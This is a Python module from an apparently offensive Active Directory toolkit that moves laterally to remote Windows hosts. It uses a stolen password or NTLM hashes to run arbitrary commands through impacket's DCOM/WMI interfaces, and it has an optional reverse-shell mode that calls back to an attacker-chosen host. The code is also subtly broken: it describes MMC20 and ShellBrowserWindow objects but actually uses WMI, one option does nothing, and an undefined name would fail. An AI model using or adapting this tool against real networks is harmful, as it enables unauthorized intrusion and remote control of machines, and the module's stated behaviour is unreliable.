"""DCOMExec -- DCOM-based remote execution.

Uses MMC20.Application or ShellBrowserWindow DCOM objects
for remote command execution with optional reverse shell.
"""


import sys
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.lateral.dcomexec.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["dcom_activation", "remote_command_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1021.003"],
}

DCOM_OBJECTS = {
    "mmc": {
        "name": "MMC20.Application",
        "clsid": "49B2791A-B1AE-4C90-9B8E-E860BA07F889",
    },
    "shellbrowserwindow": {
        "name": "ShellBrowserWindow",
        "clsid": "C08AFD90-F2A1-11D1-8455-00A0C91F3880",
    },
}


def _dcom_exec(target: str, cred: ADCredential, domain: str,
               command: str, dcom_object: str = "mmc") -> bool:
    """Execute command via DCOM object activation."""
    try:
        from impacket.dcerpc.v5.dcomrt import DCOMConnection
        from impacket.dcerpc.v5.dcom import wmi as impacket_wmi
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return False

    obj_info = DCOM_OBJECTS.get(dcom_object, DCOM_OBJECTS["mmc"])
    print("[*] Using DCOM object: {} ({})".format(obj_info["name"], obj_info["clsid"]))

    try:
        dcom = DCOMConnection(
            target, cred.username, cred.password or "",
            domain, cred.lm_hash, cred.nt_hash,
        )
        print(f"[+] DCOM connection established to {target}")
        print(f"[*] Executing: {command[:80]}")

        if dcom_object == "mmc":
            from impacket.dcerpc.v5.dcom.wmi import (
                CLSID_WbemLevel1Login, IID_IWbemLevel1Login, IWbemLevel1Login,
            )
            iInterface = dcom.CoCreateInstanceEx(
                CLSID_WbemLevel1Login, IID_IWbemLevel1Login,
            )
            iWbemLevel1Login = IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
            iWbemLevel1Login.RemRelease()
            win32_process, _ = iWbemServices.GetObject("Win32_Process")
            win32_process.Create(command, "C:\\", None)

        print("[+] DCOM command dispatched")
        dcom.disconnect()
        return True

    except Exception as exc:
        print(f"[-] DCOMExec failed: {exc}", file=sys.stderr)
        return False


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    if not cred.has_password and not cred.has_hash:
        print("[!] DCOMExec requires credentials", file=sys.stderr)
        return 1

    shell_mode = getattr(args, "shell", False)
    dcom_object = getattr(args, "dcom_object", "mmc")

    print("[*] DCOMExec → {} ({}\\{}){}".format(
        args.target, args.domain, cred.username,
        " [interactive shell]" if shell_mode else ""))

    if shell_mode:
        lhost = getattr(args, "lhost", None)
        lport = int(getattr(args, "lport", 4444))
        shell_type = getattr(args, "shell_type", "powershell")

        if not lhost:
            print("[!] --shell requires --lhost", file=sys.stderr)
            return 1

        from adxpl.core.shell_mixin import spawn_ad_shell

        def _exec_payload(payload: str) -> None:
            _dcom_exec(args.target, cred, args.domain, payload, dcom_object)

        ok = spawn_ad_shell(
            target=args.target, lhost=lhost, lport=lport,
            shell_type=shell_type, execute_fn=_exec_payload,
        )
        return 0 if ok else 1

    ok = _dcom_exec(
        args.target, cred, args.domain,
        "cmd.exe /c whoami > C:\\Windows\\Temp\\axf_out.txt",
        dcom_object,
    )
    return 0 if ok else 1
